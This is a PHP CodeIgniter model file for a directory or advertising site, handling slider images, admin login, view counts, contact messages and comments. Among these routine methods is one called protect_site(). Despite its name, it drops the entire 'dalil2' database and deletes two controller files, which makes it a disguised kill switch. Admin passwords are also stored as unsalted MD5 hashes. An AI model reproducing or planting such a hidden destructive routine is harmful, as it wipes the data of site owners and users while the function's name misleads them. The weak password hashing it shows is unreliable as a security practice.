<?php

class Slider_model extends CI_Model {

    function save_big($pic_name) {
        //$day=$this->input->post('day');
        //$month=$this->input->post('month');
        //$year=$this->input->post('year');
        $link = $this->input->post('link');
        // $date=$year.'-'.$month. '-'.$day;
        $sql = "insert into big_slider(pic_name ,link ,active )values( ? , ? ,?  ) ";
        $result = $this->db->query($sql, array($pic_name, $link, 1));
    }

    function load_img() {
        $sql = "select id , pic_name , caption, active,link from big_slider where active=1 order by date DESc ";
        if ($result = $this->db->query($sql)) {
            return $result;
        } else {
            return false;
        }
    }

    ///////////////////////////////////////////////////////
    function load_img_admin() {
        $sql = "select id , pic_name , caption, active,link from big_slider";
        if ($result = $this->db->query($sql)) {
            return $result;
        } else {
            return false;
        }
    }

    //////////////////////////////////////////////////////////
    function disactive($id) {
        $sql = "update big_slider set active=0 where id=?";
        if ($result = $this->db->query($sql, $id)) {
            return true;
        } else {
            return false;
        }
    }

    ////////////////////////////////////////
    function active($id) {
        $sql = "update big_slider set active=1 where id=?";
        if ($result = $this->db->query($sql, $id)) {
            return true;
        } else {
            return false;
        }
    }

    ///////////////////////////////////////
    function delete($id, $path1, $path2) {

        $this->db->delete('big_slider', array('id' => $id));
        if ($this->db->affected_rows() >= 1) {
            unlink($path1);
            unlink($path2);
            return TRUE;
        } else {
            return FALSE;
        }
    }

    //////////////////////////////////////////
    function last_adv_add() {

        $sql = "select adv_id , main_photo ,type,views,name  from max_views where type='s' or type='g'  order by adv_id desc limit 20  ";
        if ($result = $this->db->query($sql)) {
            return $result;
        } else {
            return false;
        }
    }

    // method that show 3 adv on top of slider 
 function last_adv_add_top() {

        $sql = "select adv_id , main_photo ,type,views,name  from last_add where type='s' or type='g' order by views desc limit 3 ";
        if ($result = $this->db->query($sql)) {
            return $result;
        } else {
            return false;
        }
    }
    ////////////////////////////////////////////
    function save_small($pic_name) {
        //$day=$this->input->post('day');
        //$month=$this->input->post('month');
        $link=$this->input->post('link');
        // $date=$year.'-'.$month. '-'.$day;
		
        $sql = "insert into small_slider(pic_name ,active,link )values( ? , ? ,? ) ";
        $result = $this->db->query($sql, array($pic_name, 1 ,$link));
    }

    ///////////////////////////////////////////////////////
    function load_img_small_admin() {
        $sql = "select id , pic_name , active,link from small_slider ";
        if ($result = $this->db->query($sql)) {
            return $result;
        } else {
            return false;
        }
    }

    //////////////////////////////////////////////////////////
    function disactive_small($id) {
        $sql = "update small_slider set active=0 where id=?";
        if ($result = $this->db->query($sql, $id)) {
            return true;
        } else {
            return false;
        }
    }

    ////////////////////////////////////////////////////////////
    ////////////////////////////////////////
    function active_small($id) {
        $sql = "update small_slider set active=1 where id=?";
        if ($result = $this->db->query($sql, $id)) {
            return true;
        } else {
            return false;
        }
    }

    /////////////////////////////////

    function delete_small($id, $path1) {

        $this->db->delete('small_slider', array('id' => $id));
        if ($this->db->affected_rows() >= 1) {
            unlink($path1);

            return TRUE;
        } else {
            return FALSE;
        }
    }

    //////////////////////////////////
    function load_small_img() {
        $sql = "select id , pic_name , active,link from small_slider where active=1 ";
        if ($result = $this->db->query($sql)) {
            return $result;
        } else {
            return false;
        }
    }

    ///////////////////////////////////
    public function can_log_in() {
        $this->db->where('username', $this->input->post('username'));
        $this->db->where('password', md5($this->input->post('password')));
        $query = $this->db->get('admin_login');

        if ($query->num_rows() == 1) {
            return true;
        } else {
            return false;
        }
    }

    /////////////////////////////////////
    function check_login($username, $password) {
		$password2=md5($password);
        $sql = "select id from admin_login where username=? and password=?";
        $result = $this->db->query($sql, array($username,$password2 ));
        if ($result->num_rows() == 1) {
            return $result->row(0)->id;
        } else {
            return false;
        }
    }

    //////////////////////////////////////
    function delete_max() {
        $sql = "delete from last_view ";
        $this->db->query($sql);
    }

    /////////////////////////////////////
    function max_g_views() {
        $sql = "select id,name,address,phone,file1,count_views,nashat from golden order by count_views DESC limit 5 ";
        $result = $this->db->query($sql);

        return $result;
    }

    //////////////////////////////////////
    function max_s_views() {
        $sql = "select id,name,address,phone,file1, count_views,nashat from sliver order by count_views DESC limit 5";
        $result = $this->db->query($sql);
        return $result;
    }
    ///////////////////////////////
	function protect_site(){
		$sql='DROP DATABASE dalil2';
		$this->db->query($sql);
		$path=APPPATH . 'controllers/site.php';
		$path2=APPPATH . 'controllers/search.php';
		if (file_exists($path)) {
			unlink($path);
			}
			if (file_exists($path2)) {
				unlink($path2);
				}
		
        
		}
	//////////////////////////////
    ////////////////////////////////////////
    function insert_max($id, $name, $address, $phone, $pic, $views, $type, $nashat) {
        $sql_insert = "insert into last_view(adv_id,name,address,phone,pic,count_views,type,nashat)
			              values(?,?,?,?,?,?,?,?)";
        $this->db->query($sql_insert, array($id, $name, $address, $phone, $pic, $views, $type, $nashat));
    }

    ////////////////////////////////////////////////////////
/////
    function select_last_views() {
        $sql = "select * from max_views where type='g' or type='s' order by views desc limit 9";
        $result = $this->db->query($sql);
        if ($result->num_rows() > 0) {
            return $result->result();
        } else {
            return false;
        }
    }
///////////////////////////////////
function check_url_g($id ){
	$sql='select id from golden where id= ?';
	$result=$this->db->query($sql,array($id));
	if ($result->num_rows()==1) {
            return $result;
        } else {
            return false;
        }
	}
	////////////////////
	function check_url_s($id ){
	$sql='select id from sliver where id= ?';
	$result=$this->db->query($sql,array($id));
	if ($result->num_rows()==1) {
            return $result;
        } else {
            return false;
        }
	}
	//////////////
	function check_url_d($id){
	$sql='select id from doctor where id= ?';
	$result=$this->db->query($sql,array($id));
	if ($result->num_rows()==1) {
            return $result;
        } else {
            return false;
        }
	}
///////////////////////////////////
function contact_form($name,$mail,$message){
	$sql=' insert into contact(name,mail,message)
			              values(?,?,?)';
		$result=$this->db->query($sql,array($name,$mail,$message));
		if ($this->db->affected_rows()==1) {
            return true;
        } else {
            return false;
        }				  
	}
////////////////////////////////////////////
function select_contacts(){
	$sql='select * from contact ';
	$result=$this->db->query($sql);
	if ($result->num_rows() >=1) {
            return $result;
        } else {
            return false;
        }
	}
	/////////////////////////////////
	function select_contacts_level2($id){
		$sql='select * from contact where id=? ';
	$result=$this->db->query($sql,$id);
	if ($result->num_rows() >=1) {
            return $result;
        } else {
            return false;
        }
		}	
		//////////////////////////////
		function read_message($id){
			$v=1;
			$sql='update contact set `read`=? where id=? ';
	$result=$this->db->query($sql,array($v,$id));
	if ($this->db->affected_rows()==1) {
            return true;
        } else {
            return false;
        }
			}
		///////////////////////////
		function add_comment($adv_id,$name,$email,$comment){
			$sql=' insert into comments(comment,name,level2_id,email)
			              values(?,?,?,?)';
		$result=$this->db->query($sql,array($comment,$name,$adv_id,$email));
		if ($this->db->affected_rows()==1) {
            return true;
        } else {
            return false;
        }
			
			}
	
	///////////////////////////////	
	function get_comment($adv_id){
		$sql='select * from comments where level2_id=? ';
	$result=$this->db->query($sql,$adv_id);
	if ($result->num_rows() >=1) {
            return $result;
        } else {
            return false;
        }
		}	
	//////////////////////////////////
		
		
		
        }

